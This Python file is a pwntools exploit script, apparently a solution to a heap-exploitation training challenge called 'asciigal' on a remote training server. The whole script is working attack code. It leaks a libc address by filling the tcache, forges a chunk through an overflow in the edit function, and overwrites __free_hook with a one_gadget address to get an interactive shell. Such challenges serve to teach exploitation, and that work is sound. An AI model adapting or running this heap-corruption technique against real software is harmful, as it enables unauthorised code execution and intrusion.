from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./asciigal")
	gdb.attach(r, """
		c
		""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 3004)


#init_art calls add_art that fill in pics

def new_art(name, size, art_content):
	r.recvuntil("> ")
	r.sendline(b"0")
	r.recvuntil("name> ")
	r.sendline(b"%s" % name)
	r.recvuntil("art sz> ")
	r.sendline(b"%d" % size)
	sleep(0.05)
	r.sendline(art_content)
	#r.sendline(b"%s" % art_content)
    #address = int(r.recvuntil("\n"),16) #Integer base 16

def print_art(art_index):
	r.recvuntil("> ")
	r.sendline(b"1")
	r.recvuntil("art#> ")
	r.sendline("%d" % art_index)
	return r.recvuntil("**************\n")

def delete_art(art_index): #free
	r.recvuntil("> ")
	r.sendline(b"2")
	r.recvuntil("art#> ")
	r.sendline("%d" % art_index)
	r.recvuntil("was deleted")

def edit_art(art_index, new_name, size, art_content): #malloc
	r.recvuntil("> ")
	r.sendline(b"3")
	r.recvuntil("art#> ")
	r.sendline("%d" % art_index)
	r.recvuntil("name> ")
	r.sendline("%s" % new_name)
	r.recvuntil("art sz> ")
	r.sendline("%d" % size)
	sleep(0.05)
	r.send(art_content)


#LEAK LIBC
delete_art(0) #delete firt art

for index in range(9):
    name = b'N'* 99
    size = 0x200
    art_content = b'C' * 99
    new_art(name, size, art_content)

#for index in range(10):
#    print(print_art(index))

for index in range(8): #7 fills tcache the other one is pointed by main_arena
    delete_art(index)

for index in range(7):
    name = b'M'*99
    size = 0x200
    art_content = b'D' * 99
    new_art(name, size, art_content)
new_art(b'a', 0x200, b'K'*7)

#print("\n")
#for index in range(10):
#    print(print_art(index))
print("\n")
print(print_art(7))

r.recvuntil("> ")
r.sendline(b"1")
r.recvuntil("art#> ")
r.sendline(b'7')
r.recvuntil(b'KKKKKKK\n')
libc_leak = u64(r.recvuntil(b'C')[:-1])

#Useful Values
main_base_local = 0x55555555592d
libc_leak_local = 0x7ffff7dcfca0
libc_base_local = 0x007ffff79e4000
libc_offset = libc_leak_local - libc_base_local
main_offset = libc_leak_local - main_base_local
libc_base = libc_leak - libc_offset
main_base = libc_leak - main_offset
one_gadget = libc_base + 0x4f322 # 0x4f322 0x10a38c 0x4f2c5
malloc_hook_offset = 0x3ebc30
malloc_hook = libc_base + malloc_hook_offset
free_hook_offset =  0x3ed8e8
free_hook = libc_base + free_hook_offset
fake_chunk_m = malloc_hook - 0x23
fake_chunk_f = free_hook - 0xb

print("\n")
print("[!] libc_leak: %#x" % libc_leak)
print("[!] main_base: %#x" % main_base)
print("[!] libc_base: %#x" % libc_base)
print("[!] one_gadget: %#x" % one_gadget)
print("[!] malloc_hook: %#x" % malloc_hook)
print("[!] free_hook: %#x" % free_hook)


delete_art(8)


input("wait")

payload =  b'\x00'* 0x200 + (p64(0x0210)+p64(0x31)) + b'\x00' * 0x20 + (p64(0x00)+p64(0x71)) + b'\x00' * 0x60 + (p64(0x0)+ p64(0x211)) + p64(fake_chunk_f)
edit_art(7, "fakechunk", 0x2C0, payload)

input("wait")

name = b'x'
size = 0x200
art_content = 'SSSSSSSS'
new_art(name, size, art_content)

input("wait")

name = b'y'
size = 0x200
art_content = b'S'*0xb + p64(one_gadget)
new_art(name, size, art_content)

input("wait")

name = b'x'
size = 0x200
art_content = 'SSSSSSSS'
new_art(name, size, art_content)
#free hook works without a free because the binary program actually does a free if the malloc does not complete. 
#In this case we have finished the intended n of chunks and it does a free after trying to alloc another one.

r.interactive()
